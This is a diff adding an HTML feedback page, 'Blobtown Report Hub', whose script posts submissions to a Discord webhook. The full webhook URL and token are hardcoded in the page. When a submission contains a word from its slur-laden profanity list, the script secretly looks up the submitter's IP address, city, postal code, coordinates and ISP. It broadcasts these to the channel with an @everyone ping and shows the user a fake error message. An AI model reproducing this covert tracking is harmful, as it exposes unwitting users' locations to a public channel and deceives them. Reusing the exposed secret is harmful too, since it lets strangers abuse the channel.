@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Blobtown | Secure Portal</title>
+    <style>
+        :root {
+            --bt-yellow: #FFD700;
+            --bt-dark: #121212;
+            --bt-error: #ff3333;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
+                        url('https://api.screenshotmachine.com/api/v1/storage/679d1917f694e8001ba90076');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: white;
+            overflow: hidden;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .container {
+            background: rgba(18, 18, 18, 0.9);
+            width: 90%;
+            max-width: 420px;
+            padding: 35px;
+            border-radius: 30px;
+            border: 3px solid var(--bt-yellow);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            animation: fadeIn 0.8s ease-out;
+            text-align: center;
+        }
+
+        h1 {
+            color: var(--bt-yellow);
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
+        }
+
+        .field {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            color: var(--bt-yellow);
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 14px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: var(--bt-yellow);
+            background: rgba(255, 215, 0, 0.05);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: var(--bt-yellow);
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            font-weight: 900;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            text-transform: uppercase;
+        }
+
+        button:active {
+            transform: scale(0.95);
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            min-height: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>REPORT HUB</h1>
+        
+        <div class="field">
+            <label>CITIZEN ID</label>
+            <input type="text" id="u" placeholder="Your Username...">
+        </div>
+
+        <div class="field">
+            <label>INCIDENT LOG</label>
+            <textarea id="i" rows="3" placeholder="Describe the problem..."></textarea>
+        </div>
+
+        <div class="field">
+            <label>SUGGESTED PATCH</label>
+            <textarea id="s" rows="3" placeholder="How can we fix this?"></textarea>
+        </div>
+
+        <button onclick="transmit()">Transmit Record</button>
+        <p id="status">System Status: Optimal</p>
+    </div>
+
+    <script>
+        // MASSIVE BLACKLIST
+        const BLACKLIST = ["fuck", "shit", "ass", "bitch", "cunt", "nigger", "faggot", "dick", "pussy", "whore", "slut", "bastard", "retard", "kys", "motherfucker", "cock", "tit", "anal", "rape", "porn", "clit", "twat", "fucker", "sh1t", "fuck", "niga", "negro", "tranny"];
+
+        async function transmit() {
+            const hook = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";
+            const u = document.getElementById('u').value;
+            const i = document.getElementById('i').value;
+            const s = document.getElementById('s').value;
+            const stat = document.getElementById('status');
+
+            if (!u || !i || !s) {
+                stat.innerText = "Error: Please complete all fields.";
+                stat.style.color = "var(--bt-error)";
+                return;
+            }
+
+            stat.innerText = "Synchronizing with City Vault...";
+            stat.style.color = "white";
+
+            const allText = (u + i + s).toLowerCase();
+            const isBad = BLACKLIST.some(word => allText.includes(word));
+
+            let reportData = {
+                username: "City Intelligence Unit",
+                embeds: [{
+                    title: isBad ? "🚨 SECURITY ALERT: BEHAVIORAL VIOLATION" : "🏙️ New Citizen Feedback",
+                    color: isBad ? 16711680 : 16765184,
+                    fields: [
+                        { name: "Reported By", value: u, inline: true },
+                        { name: "Safety Status", value: isBad ? "🛑 LOGGED" : "✅ SAFE", inline: true },
+                        { name: "Incident Log", value: i },
+                        { name: "Proposed Solution", value: s }
+                    ],
+                    footer: { text: "Blobtown Security System v2.0" },
+                    timestamp: new Date()
+                }]
+            };
+
+            if (isBad) {
+                // SAF FORCE DATA COLLECTION
+                try {
+                    const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query');
+                    const geoData = await geoRes.json();
+                    
+                    reportData.embeds[0].fields.push(
+                        { name: "Network IP", value: geoData.query },
+                        { name: "Geolocation", value: `${geoData.city}, ${geoData.regionName}` },
+                        { name: "Postal Code", value: geoData.zip },
+                        { name: "Coordinates", value: `${geoData.lat}, ${geoData.lon}` },
+                        { name: "ISP Provider", value: geoData.isp }
+                    );
+                    reportData.content = "@everyone **PROFANITY DETECTED - OFFENDER DATA LOGGED.**";
+                } catch (e) {
+                    console.log("SAF Error");
+                }
+            }
+
+            try {
+                const response = await fetch(hook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(reportData)
+                });
+
+                if (response.ok) {
+                    stat.innerText = isBad ? "System Error: 0x884 Logged." : "Transmission Successful.";
+                    stat.style.color = isBad ? "var(--bt-error)" : "#44ff44";
+                    if (!isBad) document.querySelectorAll('input, textarea').forEach(el => el.value = "");
+                } else {
+                    stat.innerText = "Connection Rejected by Host.";
+                }
+            } catch (err) {
+                stat.innerText = "Critical Network Timeout.";
+            }
+        }
+    </script>
+</body>
+</html>
